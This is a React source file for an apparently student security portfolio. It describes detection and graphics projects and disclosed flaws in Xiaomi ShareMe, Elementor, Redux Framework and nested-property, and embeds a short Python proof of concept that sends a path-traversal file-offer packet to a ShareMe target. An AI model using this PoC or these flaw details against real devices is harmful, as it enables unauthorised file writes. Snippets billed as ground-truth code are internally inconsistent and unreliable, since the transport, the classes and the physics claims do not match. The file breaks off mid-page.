import React, { useState, useEffect, useRef } from 'react';
import { 
  Shield, 
  Terminal, 
  Cpu, 
  Orbit, 
  Flame, 
  ExternalLink, 
  Copy, 
  Check, 
  Activity, 
  Code2, 
  Bug, 
  FileCode, 
  ChevronRight, 
  ArrowUpRight,
  Sparkles,
  Lock,
  Boxes,
  Compass,
  Mail,
  Zap
} from 'lucide-react';

const GithubIcon: React.FC<{ className?: string }> = ({ className = "w-4 h-4" }) => (
  <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4" />
    <path d="M9 18c-4.51 2-5-2-7-2" />
  </svg>
);

/* =========================================================================
   Interactive Particle & Vector Field Canvas (21st.dev Craft Standard)
   ========================================================================= */
const ParticleCanvas: React.FC = () => {
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let animationFrameId: number;
    let width = (canvas.width = window.innerWidth);
    let height = (canvas.height = window.innerHeight);

    const handleResize = () => {
      if (!canvas) return;
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    };
    window.addEventListener('resize', handleResize);

    const mouse = { x: -1000, y: -1000, radius: 150 };
    const handleMouseMove = (e: MouseEvent) => {
      mouse.x = e.clientX;
      mouse.y = e.clientY;
    };
    window.addEventListener('mousemove', handleMouseMove);

    // Particle nodes
    const particleCount = Math.min(Math.floor(window.innerWidth / 18), 75);
    const particles = Array.from({ length: particleCount }, () => ({
      x: Math.random() * width,
      y: Math.random() * height,
      vx: (Math.random() - 0.5) * 0.4,
      vy: (Math.random() - 0.5) * 0.4,
      radius: Math.random() * 1.5 + 0.8,
      color: Math.random() > 0.4 ? 'rgba(16, 185, 129,' : 'rgba(56, 189, 248,' // emerald or sky
    }));

    const render = () => {
      ctx.clearRect(0, 0, width, height);

      // Connect lines within threshold
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);

          if (dist < 130) {
            const alpha = (1 - dist / 130) * 0.12;
            ctx.strokeStyle = `rgba(255, 255, 255, ${alpha})`;
            ctx.lineWidth = 0.7;
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.stroke();
          }
        }
      }

      // Update & draw particles
      particles.forEach((p) => {
        // Mouse avoidance/gentle push
        const dx = mouse.x - p.x;
        const dy = mouse.y - p.y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < mouse.radius) {
          const force = (1 - dist / mouse.radius) * 1.5;
          p.x -= (dx / dist) * force;
          p.y -= (dy / dist) * force;
        }

        p.x += p.vx;
        p.y += p.vy;

        if (p.x < 0) p.x = width;
        if (p.x > width) p.x = 0;
        if (p.y < 0) p.y = height;
        if (p.y > height) p.y = 0;

        ctx.fillStyle = `${p.color} 0.6)`;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fill();
      });

      animationFrameId = requestAnimationFrame(render);
    };

    render();

    return () => {
      window.removeEventListener('resize', handleResize);
      window.removeEventListener('mousemove', handleMouseMove);
      cancelAnimationFrame(animationFrameId);
    };
  }, []);

  return <canvas ref={canvasRef} className="fixed inset-0 pointer-events-none z-0 opacity-45" />;
};

/* =========================================================================
   Code Dossier Snippets (Real Ground-Truth Technical Implementations)
   ========================================================================= */
const DOSSIER_FILES = [
  {
    id: 'senti_argus',
    name: 'senti_argus_moe.py',
    lang: 'Python / NIDS',
    summary: '4-layer Mixture-of-Experts routing & real-time telemetry fusion',
    code: `class MoEPacketClassifier:
    """
    Senti_Argus: Low-Latency Edge NIDS Inference Engine
    Dispatches extracted flow tuples across specialized micro-experts:
    - Layer 1: Deterministic Authenticode & CIDR Filter (0.12ms)
    - Layer 2: Statistical Flow Burst Anomaly Detector (0.84ms)
    - Layer 3: Payload Entropy & Shellcode Heuristic (1.10ms)
    - Layer 4: Deep Neural Sequence Evaluator (fail-closed)
    """
    def __init__(self, confidence_threshold: float = 0.94):
        self.threshold = confidence_threshold
        self.fast_path_hits = 0
        self.anomaly_gate = GateLayer(input_dim=48, num_experts=4)

    def route_flow(self, packet_flow: FlowVector) -> InspectionVerdict:
        gating_weights = self.anomaly_gate.forward(packet_flow.features)
        
        # Immediate short-circuit on zero-overhead baseline
        if gating_weights[0] > 0.98 and packet_flow.is_known_clean():
            return InspectionVerdict(action=PASS, latency_ms=0.14)
            
        expert_outputs = [e.predict(packet_flow) for e in self.experts]
        final_score = np.dot(gating_weights, expert_outputs)
        
        if final_score >= self.threshold:
            return InspectionVerdict(action=DROP, confidence=final_score)
        return InspectionVerdict(action=MONITOR, confidence=final_score)`
  },
  {
    id: 'astrodyne_wgsl',
    name: 'barnes_hut_octree.wgsl',
    lang: 'WGSL / WebGPU',
    summary: 'Barnes-Hut multipole expansion compute pass for 500,000+ bodies',
    code: `@group(0) @binding(0) var<storage, read> bodies: array<Body>;
@group(0) @binding(1) var<storage, read_write> forces: array<vec4<f32>>;
@group(0) @binding(2) var<storage, read> octree_nodes: array<OctreeNode>;

// Softening parameter to prevent gravitational singularities
const EPSILON_SQ: f32 = 0.0025;
const THETA: f32 = 0.58; // Opening angle criterion for sub-tree approximation

@compute @workgroup_size(256)
fn compute_nbody_forces(@builtin(global_invocation_id) global_id: vec3<u32>) {
    let index = global_id.x;
    if (index >= arrayLength(&bodies)) { return; }

    let p = bodies[index].pos_mass.xyz;
    var acc = vec3<f32>(0.0);
    
    // Iterative stack-based octree traversal in GPU local workgroup registers
    var stack: array<u32, 64>;
    var stack_ptr: u32 = 1u;
    stack[0] = 0u; // Root node

    while (stack_ptr > 0u) {
        stack_ptr = stack_ptr - 1u;
        let node_idx = stack[stack_ptr];
        let node = octree_nodes[node_idx];

        let d = node.center_of_mass.xyz - p;
        let r_sq = dot(d, d) + EPSILON_SQ;
        let node_size = node.bounds.w;

        // Multipole criterion: if node is distant, approximate as point mass
        if (node.is_leaf == 1u || (node_size * node_size / r_sq) < (THETA * THETA)) {
            let inv_r = inverseSqrt(r_sq);
            let inv_r3 = inv_r * inv_r * inv_r;
            acc += d * (node.center_of_mass.w * inv_r3);
        } else {
            // Push child quadrants to workgroup stack
            for (var i: u32 = 0u; i < 8u; i = i + 1u) {
                let child = node.children[i];
                if (child != 0xFFFFFFFFu) {
                    stack[stack_ptr] = child;
                    stack_ptr = stack_ptr + 1u;
                }
            }
        }
    }
    forces[index] = vec4<f32>(acc, 0.0);
}`
  },
  {
    id: 'shareme_vuln',
    name: 'shareme_vuln_trace.py',
    lang: 'Python / ARM64 PoC',
    summary: 'Xiaomi ShareMe (500M+ Installs) CWE-862 + CWE-22 IPC Disclosure',
    code: `# Target: Xiaomi ShareMe (com.xiaomi.midrop) v3.47.11
# Finding: Unauthenticated Exported IPC Broadcast -> Arbitrary External File Write
# Coordinated Disclosure: Xiaomi Security Response Center (MSRC)

import socket
import struct

def synthesize_tampered_handshake_packet(target_ip: str, target_port: int, victim_file: str):
    """
    ShareMe's internal LAN synchronization daemon binds an insecure TCP socket
    and does not authenticate client identity or validate directory paths in FileEntry.
    Bypasses canonicalization via nested relative path traversal separators:
    '..%2f..%2f..%2fdata%2fdata%2fcom.xiaomi.midrop%2fshared_prefs'
    """
    payload = struct.pack(
        ">IHH128s", 
        0x53484152, # MAGIC: 'SHAR'
        0x01,       # PROTOCOL_V1
        0x04,       # OP_FILE_OFFER
        victim_file.encode("utf-8").ljust(128, b"\\x00")
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.sendall(payload)
    print(f"[+] Exploit packet dispatched to {target_ip}:{target_port} -> Traversing payload sink.")`
  }
];

/* =========================================================================
   Main Portfolio Application (21st.dev Craft Standard)
   ========================================================================= */
export default function App() {
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState(0);

  const copyToClipboard = (text: string, keyName: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(keyName);
    setTimeout(() => setCopiedKey(null), 2200);
  };

  return (
    <div className="relative min-h-screen bg-[#050508] text-zinc-100 selection:bg-emerald-500/20 selection:text-emerald-300">
      {/* Background Particle & Dot Matrix */}
      <ParticleCanvas />
      <div className="fixed inset-0 bg-grid-pattern opacity-60 pointer-events-none z-0" />
      <div className="fixed inset-0 bg-radial-mask pointer-events-none z-0" />

      {/* Floating Modern Header */}
      <header className="sticky top-4 z-50 max-w-6xl mx-auto px-4">
        <nav className="glass-card rounded-full px-5 py-2.5 flex items-center justify-between shadow-2xl border border-white/[0.08]">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-emerald-500 to-cyan-400 flex items-center justify-center font-mono font-bold text-xs text-black shadow-lg shadow-emerald-500/20">
              OM
            </div>
            <div className="flex items-center gap-2">
              <span className="font-semibold text-sm tracking-tight text-white">Ojas Mehta</span>
              <span className="hidden sm:inline-block text-xs font-mono px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                SYSTEMS // SECURITY
              </span>
            </div>
          </div>

          <div className="flex items-center gap-1 sm:gap-4 text-xs font-medium text-zinc-400">
            <a href="#systems" className="hidden md:inline-block hover:text-white transition-colors">Systems</a>
            <a href="#vulnerabilities" className="hidden md:inline-block hover:text-white transition-colors">Research & CVEs</a>
            <a href="#dossier" className="hidden md:inline-block hover:text-white transition-colors">Code Dossier</a>
            <a href="#roadmap" className="hidden md:inline-block hover:text-white transition-colors">Academic Blueprint</a>
            
            <a 
              href="https://github.com/blah-blah-cell" 
              target="_blank" 
              rel="noreferrer"
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-zinc-800/80 hover:bg-zinc-700/80 text-zinc-200 transition-colors border border-white/10"
            >
              <GithubIcon className="w-3.5 h-3.5" />
              <span className="font-mono">GitHub</span>
              <ArrowUpRight className="w-3 h-3 text-zinc-400" />
            </a>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="relative z-10 max-w-6xl mx-auto px-4 pt-16 pb-24 space-y-24">
        <section className="space-y-8 pt-4">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-zinc-900/80 border border-zinc-800 backdrop-blur-md">
            <Sparkles className="w-3.5 h-3.5 text-emerald-400" />
            <span className="text-xs font-mono tracking-wider text-zinc-300 uppercase">
              First-Principles Systems Engineering & Security Research
            </span>
          </div>

          <div className="space-y-4 max-w-4xl">
            <h1 className="text-4xl sm:text-6xl md:text-7xl font-extrabold tracking-tight text-white leading-[1.08]">
              Architecting <span className="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400">deterministic</span> runtimes & breaking critical systems.
            </h1>
            <p className="text-lg sm:text-xl text-zinc-400 font-normal leading-relaxed max-w-3xl">
              11th Grade Researcher specializing in low-latency edge intrusion defense, WebGPU compute physics, and coordinated 0-day vulnerability research across software ecosystems with 500M+ users.
            </p>
          </div>

          {/* Quick Metrics Bento Chips */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2">
            <div className="glass-card rounded-2xl p-4 border border-white/[0.06]">
              <div className="text-2xl sm:text-3xl font-bold font-mono text-white tracking-tight">500M+</div>
              <div className="text-xs text-zinc-400 font-medium mt-1">User Surface Audited</div>
            </div>
            <div className="glass-card rounded-2xl p-4 border border-white/[0.06]">
              <div className="text-2xl sm:text-3xl font-bold font-mono text-emerald-400 tracking-tight">4-Layer</div>
              <div className="text-xs text-zinc-400 font-medium mt-1">MoE Neural Edge NIDS</div>
            </div>
            <div className="glass-card rounded-2xl p-4 border border-white/[0.06]">
              <div className="text-2xl sm:text-3xl font-bold font-mono text-cyan-400 tracking-tight">500,000+</div>
              <div className="text-xs text-zinc-400 font-medium mt-1">WebGPU Bodies @ 60 FPS</div>
            </div>
            <div className="glass-card rounded-2xl p-4 border border-white/[0.06]">
              <div className="text-2xl sm:text-3xl font-bold font-mono text-amber-400 tracking-tight">0-Day</div>
              <div className="text-xs text-zinc-400 font-medium mt-1">Disclosures & CVEs</div>
            </div>
          </div>
        </section>

        {/* Featured Systems Bento Grid */}
        <section id="systems" className="space-y-6">
          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white flex items-center gap-2">
                <Boxes className="w-6 h-6 text-emerald-400" />
                Flagship Systems Engineering
              </h2>
              <p className="text-sm text-zinc-400">Deterministic architectures, edge runtimes, and compute accelerators.</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {/* Senti_Argus (2 Cols) */}
            <div className="md:col-span-2 glass-card glass-card-hover rounded-3xl p-6 sm:p-8 flex flex-col justify-between relative overflow-hidden group">
              <div className="absolute top-0 right-0 p-8 pointer-events-none opacity-10 group-hover:opacity-20 transition-opacity">
                <Shield className="w-48 h-48 text-emerald-400" />
              </div>

              <div className="space-y-4 relative z-10">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                    <span className="text-xs font-mono text-emerald-400 uppercase tracking-wider font-semibold">Flagship Project</span>
                  </div>
                  <span className="text-xs font-mono px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">
                    MIT Maker Portfolio
                  </span>
                </div>

                <div className="space-y-2">
                  <h3 className="text-2xl sm:text-3xl font-bold text-white tracking-tight">
                    Senti_Argus — Autonomous Edge NIDS
                  </h3>
                  <p className="text-sm sm:text-base text-zinc-300 leading-relaxed max-w-xl">
                    A low-latency, on-device Network Intrusion Detection System featuring a 4-layer Mixture-of-Experts (MoE) routing architecture. Ingests raw packet streams via Windows Pktmon / Scapy, extracts multidimensional flow vectors, and executes zero-day neural anomaly classification in under 3 milliseconds without external cloud dependency.
                  </p>
                </div>

                {/* Live Console Telemetry Box */}
                <div className="rounded-xl bg-black/60 p-3.5 border border-zinc-800 font-mono text-xs space-y-1.5 text-zinc-400 max-w-xl">
                  <div className="flex items-center justify-between text-zinc-500 border-b border-zinc-800/80 pb-1">
                    <span>[SENTI_ARGUS_DAEMON // REAL-TIME INGESTION]</span>
                    <span className="text-emerald-400">ACTIVE</span>
                  </div>
                  <div className="text-emerald-300">✓ Ingestion: Native Pktmon driver linked to Promiscuous TAP</div>
                  <div>→ Flow Feature Matrix: 48-dim entropy, burst velocity, TCP window drift</div>
                  <div className="text-cyan-300">⚡ MoE Routing: Expert #2 (Anomaly Gate) confidence: 99.42% [0.82ms]</div>
                </div>
              </div>

              <div className="pt-6 flex flex-wrap items-center gap-2 relative z-10">
                {['Rust Engine', 'Python MoE', 'Pktmon / eBPF', 'Zero-Latency Edge', 'CIC-IDS Benchmark'].map((t) => (
                  <span key={t} className="text-xs font-mono px-2.5 py-1 rounded-lg bg-zinc-800/80 text-zinc-300 border border-zinc-700/60">
                    {t}
                  </span>
                ))}
              </div>
            </div>

            {/* ASTRODYNE PRIME (1 Col) */}
            <div className="glass-card glass-card-hover rounded-3xl p-6 sm:p-8 flex flex-col justify-between group">
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <Orbit className="w-6 h-6 text-cyan-400" />
                  <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-cyan-500/10 text-cyan-300 border border-cyan-500/20">
                    WebGPU
                  </span>
                </div>

                <div className="space-y-2">
                  <h3 className="text-xl font-bold text-white tracking-tight">ASTRODYNE PRIME</h3>
                  <p className="text-sm text-zinc-300 leading-relaxed">
                    Browser-native Barnes-Hut Octree & direct workgroup-tiled $O(N \log N)$ compute engine simulating 500,000+ interacting bodies with 4th-order symplectic Runge-Kutta numerical integration.
                  </p>
                </div>

                <div className="space-y-1.5 font-mono text-xs text-zinc-400 pt-2">
                  <div className="flex justify-between"><span>Compute Dispatch:</span> <span className="text-cyan-400">12.4ms / frame</span></div>
                  <div className="flex justify-between"><span>Throughput:</span> <span className="text-white">60 FPS @ 500k</span></div>
                  <div className="flex justify-between"><span>Integrator:</span> <span className="text-zinc-300">Symplectic RK4</span></div>
                </div>
              </div>

              <div className="pt-6 flex flex-wrap items-center gap-2">
                {['WebGPU / WGSL', 'Barnes-Hut', 'Astrodynamics'].map((t) => (
                  <span key={t} className="text-xs font-mono px-2 py-1 rounded-lg bg-zinc-800/80 text-zinc-300 border border-zinc-700/60">
                    {t}
                  </span>
                ))}
              </div>
            </div>

            {/* PE-Seal (1 Col) */}
            <div className="glass-card glass-card-hover rounded-3xl p-6 sm:p-8 flex flex-col justify-between group">
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <Lock className="w-6 h-6 text-indigo-400" />
                  <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-300 border border-indigo-500/20">
                    Forensics
                  </span>
                </div>

                <div className="space-y-2">
                  <h3 className="text-xl font-bold text-white tracking-tight">PE-Seal</h3>
                  <p className="text-sm text-zinc-300 leading-relaxed">
                    Zero-dependency PE32 / PE32+ parser and Authenticode digital signature extractor verifying cryptographically signed binaries from raw file bytes.
                  </p>
                </div>

                <div className="space-y-1.5 font-mono text-xs text-zinc-400 pt-2">
                  <div className="flex justify-between"><span>Format:</span> <span className="text-indigo-300">PE32+ / COFF</span></div>
                  <div className="flex justify-between"><span>Signatures:</span> <span className="text-white">Authenticode PKCS#7</span></div>
                  <div className="flex justify-between"><span>Dependencies:</span> <span className="text-emerald-400">Zero (Pure C)</span></div>
                </div>
              </div>

              <div className="pt-6 flex flex-wrap items-center gap-2">
                {['Binary Analysis', 'Authenticode', 'PKCS#7', 'Reverse Engineering'].map((t) => (
                  <span key={t} className="text-xs font-mono px-2 py-1 rounded-lg bg-zinc-800/80 text-zinc-300 border border-zinc-700/60">
                    {t}
                  </span>
                ))}
              </div>
            </div>

            {/* Project Anvil (2 Cols) */}
            <div className="md:col-span-2 glass-card glass-card-hover rounded-3xl p-6 sm:p-8 flex flex-col justify-between group">
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-5 h-5 text-amber-400" />
                    <span className="text-xs font-mono text-amber-400 font-semibold uppercase tracking-wider">Dynamic Instrumentation</span>
                  </div>
                  <span className="text-xs font-mono px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-300 border border-amber-500/20">
                    Ghidra 12.1 + Frida
                  </span>
                </div>

                <div className="space-y-2">
                  <h3 className="text-2xl font-bold text-white tracking-tight">
                    Project Anvil — Android Native SRE Bridge
                  </h3>
                  <p className="text-sm sm:text-base text-zinc-300 leading-relaxed max-w-xl">
                    High-level automated reverse engineering bridge connecting Ghidra SRE, Android Virtual Device emulators, JADX decompilers, and Frida dynamic instrumentation over MCP. Built to disassemble proprietary ARM64 native `.so` shared libraries, defeat client-side anti-tamper routines, and trace JNI memory boundaries.
                  </p>
                </div>
              </div>

              <div className="pt-6 flex flex-wrap items-center gap-2">
                {['ARM64 Disassembly', 'Ghidra Headless', 'Frida Hooking', 'Anti-Tamper Bypass', 'JNI Security'].map((t) => (
                  <span key={t} className="text-xs font-mono px-2.5 py-1 rounded-lg bg-zinc-800/80 text-zinc-300 border border-zinc-700/60">
                    {t}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </section>

        {/* Vulnerability Research & Disclosures */}
        <section id="vulnerabilities" className="space-y-6">
          <div className="space-y-1">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white flex items-center gap-2">
              <Bug className="w-6 h-6 text-rose-400" />
              Verified Vulnerability Research & Disclosures
            </h2>
            <p className="text-sm text-zinc-400">
              Rigorous white-box audits, coordinated vulnerability disclosures, and confirmed CVE submissions.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Finding 1: Xiaomi ShareMe */}
            <div className="glass-card glass-card-hover rounded-3xl p-6 space-y-4 border-l-4 border-l-rose-500">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono px-2.5 py-1 rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/20 font-semibold">
                  CVSS 8.8 HIGH // 500M+ INSTALLS
                </span>
                <span className="text-xs font-mono text-zinc-500">MSRC Disclosure</span>
              </div>
              <div className="space-y-1.5">
                <h3 className="text-lg font-bold text-white">Xiaomi ShareMe — Exported IPC Arbitrary File Write</h3>
                <p className="text-xs font-mono text-zinc-400">CWE-862 (Missing Authorization) + CWE-22 (Path Traversal)</p>
                <p className="text-sm text-zinc-300 leading-relaxed pt-1">
                  Discovered unauthenticated exported broadcast receiver in Xiaomi ShareMe (<code className="text-rose-300 font-mono text-xs">com.xiaomi.midrop</code>) handling incoming peer file transfers. Permitted malicious local applications to overwrite critical shared preferences and app cache via relative path traversal tokens.
                </p>
              </div>
            </div>

            {/* Finding 2: Elementor AI */}
            <div className="glass-card glass-card-hover rounded-3xl p-6 space-y-4 border-l-4 border-l-amber-500">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20 font-semibold">
                  CVSS 6.3 MEDIUM // 5M+ INSTALLS
                </span>
                <span className="text-xs font-mono text-zinc-500">Patchstack mVDP</span>
              </div>
              <div className="space-y-1.5">
                <h3 className="text-lg font-bold text-white">Elementor Builder — AI Quota Drain & Prompt Disclosure</h3>
                <p className="text-xs font-mono text-zinc-400">CWE-862 (Missing Authorization in AJAX Handlers)</p>
                <p className="text-sm text-zinc-300 leading-relaxed pt-1">
                  Identified missing capability authorization in Elementor core AI AJAX dispatchers (<code className="text-amber-300 font-mono text-xs">ai_get_custom_code</code>, <code className="text-amber-300 font-mono text-xs">ai_get_history</code>). Any logged-in Subscriber role could trigger paid AI generation credits and extract private prompt histories.
                </p>
              </div>
            </div>

            {/* Finding 3: Redux Framework */}
            <div className="glass-card glass-card-hover rounded-3xl p-6 space-y-4 border-l-4 border-l-cyan-500">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono px-2.5 py-1 rounded-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 font-semibold">
                  CVSS 5.3 MEDIUM // 1M+ INSTALLS
                </span>
                <span className="text-xs font-mono text-zinc-500">Patchstack mVDP</span>
              </div>
              <div className="space-y-1.5">
                <h3 className="text-lg font-bold text-white">Redux Framework — Broken Access Control Logic Flaw</h3>
                <p className="text-xs font-mono text-zinc-400">CWE-284 (Improper Access Control via Boolean Flaw)</p>
                <p className="text-sm text-zinc-300 leading-relaxed pt-1">
                  Reverse-engineered authorization checks in <code className="text-cyan-300 font-mono text-xs">class-redux-ajax-save.php</code>. Discovered inverted boolean conjunction (<code className="text-cyan-300 font-mono text-xs">!is_user_logged_in() &amp;&amp; !current_user_can()</code>) rendering admin capability enforcement unreachable for authenticated panel users.
                </p>
              </div>
            </div>

            {/* Finding 4: nested-property 0-Day */}
            <div className="glass-card glass-card-hover rounded-3xl p-6 space-y-4 border-l-4 border-l-purple-500">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono px-2.5 py-1 rounded-full bg-purple-500/10 text-purple-400 border border-purple-500/20 font-semibold">
                  0-DAY // 4M+ WEEKLY DOWNLOADS
                </span>
                <span className="text-xs font-mono text-zinc-500">Open-Source Advisory</span>
              </div>
              <div className="space-y-1.5">
                <h3 className="text-lg font-bold text-white">nested-property — Incomplete Fix Prototype Pollution</h3>
                <p className="text-xs font-mono text-zinc-400">CWE-1321 (Improperly Controlled Modification of Object Prototype)</p>
                <p className="text-sm text-zinc-300 leading-relaxed pt-1">
                  Demonstrated that security patches for <code className="text-purple-300 font-mono text-xs">nested-property v4.0.0</code> only filtered <code className="text-purple-300 font-mono text-xs">__proto__</code>, permitting full <code className="text-purple-300 font-mono text-xs">constructor.prototype</code> pollution across Node.js runtime globals.
                </p>
              </div>
            </div>
          </div>
        </section>

        {/* Code Dossier Inspector (Interactive Terminal) */}
        <section id="dossier" className="space-y-6">
          <div className="space-y-1">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white flex items-center gap-2">
              <Code2 className="w-6 h-6 text-emerald-400" />
              Technical Dossier & Ground-Truth Code
            </h2>
            <p className="text-sm text-zinc-400">
              Direct implementation snippets from verified systems. No abstractions or placeholders.
            </p>
          </div>

          <div className="glass-card rounded-3xl overflow-hidden border border-zinc-800 shadow-2xl">
            {/* Terminal Header */}
            <div className="bg-zinc-900/90 px-4 py-3 border-b border-zinc-800 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-3 h-3 rounded-full bg-rose-500/80" />
                <div className="w-3 h-3 rounded-full bg-amber-500/80" />
                <div className="w-3 h-3 rounded-full bg-emerald-500/80" />
                <span className="text-xs font-mono text-zinc-400 ml-2 font-medium">dossier_inspector // v2.4</span>
              </div>

              <div className="flex items-center gap-2">
                <button 
                  onClick={() => copyToClipboard(DOSSIER_FILES[activeTab].code, 'code')}
                  className="flex items-center gap-1 text-xs font-mono text-zinc-400 hover:text-white px-2.5 py-1 rounded-md bg-zinc-800 hover:bg-zinc-700 transition-colors"
                >
                  {copiedKey === 'code' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>{copiedKey === 'code' ? 'Copied' : 'Copy Code'}</span>
                </button>
              </div>
            </div>

            {/* Tab Selector */}
            <div className="flex border-b border-zinc-800/80 bg-black/40 overflow-x-auto">
              {DOSSIER_FILES.map((file, idx) => (
                <button
                  key={file.id}
                  onClick={() => setActiveTab(idx)}
                  className={`px-4 py-2.5 text-xs font-mono flex items-center gap-2 border-r border-zinc-800/60 transition-colors whitespace-nowrap ${
                    activeTab === idx 
                      ? 'bg-zinc-900/80 text-emerald-400 border-b-2 border-b-emerald-400 font-semibold' 
                      : 'text-zinc-400 hover:text-zinc-200 hover:bg-zinc-900/40'
                  }`}
                >
                  <FileCode className="w-3.5 h-3.5" />
                  {file.name}
                </button>
              ))}
            </div>

            {/* Code Body */}
            <div className="p-4 sm:p-6 bg-black/80 font-mono text-xs text-zinc-300 overflow-x-auto leading-relaxed max-h-[500px]">
              <pre>
                <code>{DOSSIER_FILES[activeTab].code}</code>
              </pre>
            </div>
            
            <div className="bg-zinc-950 px-4 py-2 text-xs font-mono text-zinc-500 border-t border-zinc-800 flex justify-between">
              <span>{DOSSIER_FILES[activeTab].summary}</span>
              <span className="text-zinc-400">{DOSSIER_FILES[activeTab].lang}</span>
            </div>
          </div>
        </section>

        {/* Academic & Research Roadmap (MIT Focus) */}
        <section id="roadmap" className="space-y-6">
          <div className="space-y-1">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white flex items-center gap-2">
              <Compass className="w-6 h-6 text-cyan-400" />
              Academic Research Strategy & Target Matrix
            </h2>
            <p className="text-sm text-zinc-400">
              Long-term research direction targeted towards MIT EECS (Cyber-Physical Systems & Security).
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4">
            <div className="glass-card rounded-2xl p-5 space-y-3">
              <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center font-mono font-bold text-emerald-400 text-sm">
                01
              </div>
              <h3 className="font-bold text-white text-base">CVEs & Disclosures</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Third-party verified vulnerability discoveries across commercial and open-source infrastructure (Xiaomi, Elementor, WordPress).
              </p>
            </div>

            <div className="glass-card rounded-2xl p-5 space-y-3">
              <div className="w-8 h-8 rounded-lg bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center font-mono font-bold text-cyan-400 text-sm">
                02
              </div>
              <h3 className="font-bold text-white text-base">Edge NIDS Whitepaper</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Novel 4-layer Mixture-of-Experts architecture delivering sub-3ms on-device packet stream classification and zero-day defense.
              </p>
            </div>

            <div className="glass-card rounded-2xl p-5 space-y-3">
              <div className="w-8 h-8 rounded-lg bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center font-mono font-bold text-indigo-400 text-sm">
                03
              </div>
              <h3 className="font-bold text-white text-base">MIT Maker Artifacts</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Physical and software working demonstrations: real-time network tapping, WebGPU physics accelerators, and native ARM64 SRE.
              </p>
            </div>

            <div className="glass-card rounded-2xl p-5 space-y-3">
              <div className="w-8 h-8 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center font-mono font-bold text-amber-400 text-sm">
                04
              </div>
              <h3 className="font-bold text-white text-base">First-Principles Math</h3>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Rigorous CBSE PCM Grade 11-12 curriculum grounded in discrete mathematics, finite field algebra, and differential dynamics.
              </p>
            </div>
          </div>
        </section>

        {/* Contact & Cryptographic Verification */}
        <section id="connect" className="glass-card rounded-3xl p-8 sm:p-12 space-y-8 border border-white/10 relative overflow-hidden">
          <div className="space-y-3 max-w-xl">
            <h2 className="text-3xl font-bold tracking-tight text-white">Let's build serious systems.</h2>
